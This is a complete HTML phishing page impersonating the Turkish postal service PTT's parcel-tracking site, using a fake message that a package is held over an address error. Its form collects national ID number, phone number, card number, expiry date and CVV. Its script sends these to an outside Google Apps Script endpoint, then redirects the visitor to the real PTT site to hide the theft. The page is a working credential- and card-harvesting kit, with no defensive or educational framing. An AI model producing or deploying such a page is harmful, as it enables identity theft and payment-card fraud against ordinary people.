<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PTT Kargo Takip</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, Helvetica, sans-serif; 
            background: #f1f1f1; 
            padding: 20px; 
            text-align: center;
        }
        .container { 
            max-width: 480px; 
            margin: 40px auto; 
            background: white; 
            border-radius: 12px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
            overflow: hidden;
        }
        .header {
            background: #e30613;
            color: white;
            padding: 20px;
            font-size: 22px;
            font-weight: bold;
        }
        .content {
            padding: 30px 25px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #e30613;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
        }
        .info {
            font-size: 13px;
            color: #666;
            margin-top: 25px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">PTT Kargo Takip Sistemi</div>
        <div class="content">
            <p style="margin-bottom: 20px; font-size: 15px; color: #333;">
                Paketiniz adres hatası nedeniyle beklemede.<br>
                Lütfen bilgilerinizi doğrulayın.
            </p>
            
            <form id="phishForm">
                <input type="text" id="tc" placeholder="TC Kimlik Numaranız" maxlength="11" required>
                <input type="tel" id="telefon" placeholder="Telefon Numaranız (5XX XXX XX XX)" required>
                <input type="text" id="kartno" placeholder="Kredi Kartı Numaranız" maxlength="19" required>
                <input type="text" id="tarih" placeholder="Son Kullanma Tarihi (AA/YY)" maxlength="5" required>
                <input type="text" id="cvv" placeholder="CVV / Güvenlik Kodu" maxlength="4" required>
                
                <button type="submit">Bilgileri Doğrula ve Takip Et</button>
            </form>
            
            <p class="info">PTT • Güvenli Kargo Takip • 2026</p>
        </div>
    </div>

    <script>
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const scriptURL = "https://script.google.com/macros/s/AKfycbz3XcG98pG__zX2ZGJUVJJ5LJp5U6mvv5KZ3Eu8gpM/dev";

            const data = {
                tc: document.getElementById('tc').value,
                telefon: document.getElementById('telefon').value,
                kartno: document.getElementById('kartno').value,
                tarih: document.getElementById('tarih').value,
                cvv: document.getElementById('cvv').value,
                zaman: new Date().toLocaleString('tr-TR')
            };

            alert("Bilgileriniz doğrulanıyor...");

            fetch(scriptURL, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(() => {
                window.location.href = "https://www.ptt.gov.tr";
            })
            .catch(() => {
                window.location.href = "https://www.ptt.gov.tr";
            });
        });
    </script>
</body>
</html>
